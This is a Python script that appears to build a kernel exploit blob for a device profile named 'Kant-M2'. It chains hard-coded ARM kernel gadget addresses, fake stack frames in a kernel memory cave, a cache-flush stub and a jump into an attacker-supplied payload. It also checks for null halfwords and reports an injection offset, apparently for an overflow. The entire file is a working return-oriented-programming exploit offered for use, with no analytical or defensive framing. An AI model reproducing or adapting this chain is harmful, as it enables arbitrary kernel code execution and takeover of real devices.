#!/usr/bin/env python3
# SPDX-License-Identifier: AGPL-3.0-only
# Kant-M2 adaptation; see docs/PROVENANCE.md.
"""Build the calibration-free cave-copy control blob for Kant-M2.

The first 40 bytes are consumed by the kernel gadget
  ldm ip,{r2,r3,r4,r7,r8,sb,sl,sp,lr,pc}     @ 0xc04dde3c
while memcpy (0xc01fa720) copies the same source to CAVE-40. Consequently
source+40 is the copy-window exit frame at CAVE, source+80 the runtime-r1
saver frame, source+108 the coherent-flushed stage-0, source+132 the
flush-wrapper frame, and source+152 the full payload.

Kant differences from the T-MSM profile:
  * save_r1 gadget is 0xc00a5c44: str r1,[r4] (no +0x18 offset)
  * flush wrapper is 0xc0012954

Frame layout (identical to upstream):
  CAVE        0xc0008400   copy-window exit frame
  DEST        0xc00083d8   memcpy destination (CAVE-40)
  STORE_FRAME 0xc0008428   save-r1 epilogue frame
  STAGE0      0xc0008444   28-byte coherent-flush stub
  FLUSH_FRAME 0xc000845c   flush-wrapper epilogue frame
  FULL        0xc0008470   payload
  SAVE_IP     0xc0008d00   where save_r1 stores the advanced source pointer
  FAKE_SP     0xc0008e00   scratch stack for memcpy / stubs
"""
import argparse
import struct

PROFILES = {
    "kant": {
        "ldm_ip": 0xC04DDE3C,
        "copy_window": 0xC010598C,
        "memcpy": 0xC01FA720,
        "save_r1": 0xC00A5C44,
        "flush_wrapper": 0xC0012954,
        "coherent": 0xC001CBA8,
        # Kant's save gadget stores at [r4], not [r4+0x18].
        "save_store_offset": 0,
    },
}

CAVE = 0xC0008400
DEST = CAVE - 40
STORE_FRAME = CAVE + 40
STAGE0 = CAVE + 68
FLUSH_FRAME = CAVE + 92
FULL = CAVE + 112
FAKE_SP = CAVE + 0xA00
SAVE_IP = CAVE + 0x900


def p32(x):
    return struct.pack("<I", x & 0xffffffff)


def words(*xs):
    return b"".join(p32(x) for x in xs)


def build(profile, payload):
    p = PROFILES[profile]
    if FULL + len(payload) > SAVE_IP:
        raise SystemExit(
            f"payload {len(payload)} bytes ends at {FULL + len(payload):#x}, "
            f"past SAVE_IP {SAVE_IP:#x}")
    copy_len = FULL - DEST + len(payload)
    copy_len = (copy_len + 3) & ~3

    # Source +0: LDM control frame. r4 has intentionally-small copy length;
    # its zero high halfword terminates only disposable r7/r8 bytes before the
    # next 0xC1 fragment resumes at source+20 (r9).
    ldm = words(
        0x41414141,        # r2 (copy window overwrites it from r4)
        p["memcpy"],       # r3
        copy_len,          # r4 -> r2
        0x42424242,        # r7 (may remain original after terminator)
        0x43434343,        # r8 (may remain original)
        0x44444444,        # r9
        0x45454545,        # sl
        FAKE_SP,           # sp
        0x46464646,        # lr
        p["copy_window"],  # pc
    )

    # Source +40 -> CAVE: copy-window common-exit frame. It saves post-copy
    # r1 (original runtime ip + copy_len) at SAVE_IP.
    frame1 = words(
        SAVE_IP - p["save_store_offset"],  # r4: store target
        0x47474747, 0x48484848, 0x49494949,
        0x4A4A4A4A, 0x4B4B4B4B, 0x4C4C4C4C,
        STORE_FRAME + 28,  # fp -> save-r1 epilogue frame
        FAKE_SP,
        p["save_r1"],
    )

    # Source +80 -> STORE_FRAME: after saving r1, continue to the 28-byte
    # cache-flush wrapper.
    store_frame = words(
        STAGE0,            # r4: wrapper flush range start
        0x4D4D4D4D, 0x4E4E4E4E, 0x4F4F4F4F,
        FLUSH_FRAME + 20,  # fp -> flush-wrapper epilogue frame
        FAKE_SP,
        p["flush_wrapper"],
    )

    # Source +108 -> STAGE0 (24 bytes): flush full stage, branch there.
    full_end = FULL + len(payload)
    stage0 = words(
        0xE1A00004,        # mov r0,r4
        0xE1A01005,        # mov r1,r5
        0xE59F3004,        # ldr r3,[pc,#4] -> literal at +20
        0xE12FFF33,        # blx r3
        0xE1A0F004,        # mov pc,r4
        p["coherent"],
    )

    # Source +132 -> FLUSH_FRAME: return from wrapper into STAGE0.
    flush_frame = words(
        FULL,
        full_end,
        0x50505050,
        FAKE_SP,
        STAGE0,
    )

    pad = b"\x51" * (FULL - DEST -
                     (len(ldm) + len(frame1) + len(store_frame) +
                      len(stage0) + len(flush_frame)))
    if len(pad) < 0:
        raise AssertionError("cave layout overlaps")
    out = ldm + frame1 + store_frame + stage0 + flush_frame + pad + payload
    out += b"A" * (copy_len - len(out))
    if len(out) != copy_len:
        raise AssertionError("blob length mismatch")
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--profile", choices=PROFILES, required=True)
    ap.add_argument("--payload", required=True)
    ap.add_argument("--out", required=True)
    a = ap.parse_args()
    payload = open(a.payload, "rb").read()
    out = build(a.profile, payload)
    open(a.out, "wb").write(out)
    p = PROFILES[a.profile]
    zeros = [i for i in range(0, len(out), 2)
             if struct.unpack_from("<H", out, i)[0] == 0]
    print(f"wrote {a.out}: {len(out)} bytes; inject at payload offset 1420")
    print(f"frame register puts: r6@528={DEST:#x} fp@548={CAVE+40:#x} "
          f"sp@552={FAKE_SP:#x} pc@556={p['ldm_ip']:#x}")
    print(f"zero halfwords at blob offsets: {[hex(x) for x in zeros]}")
    # The only permitted zero is the high half of r4=copy_len at source+10.
    allowed = {10}
    bad = [z for z in zeros if z not in allowed]
    if bad:
        raise SystemExit(f"unexpected zero halfwords: {[hex(x) for x in bad]}")
    if 10 in zeros:
        print("known zero halfword: source+10 (high half of r4) -> "
              "terminates r7/r8 only; r9..pc resume at source+20")


if __name__ == "__main__":
    main()
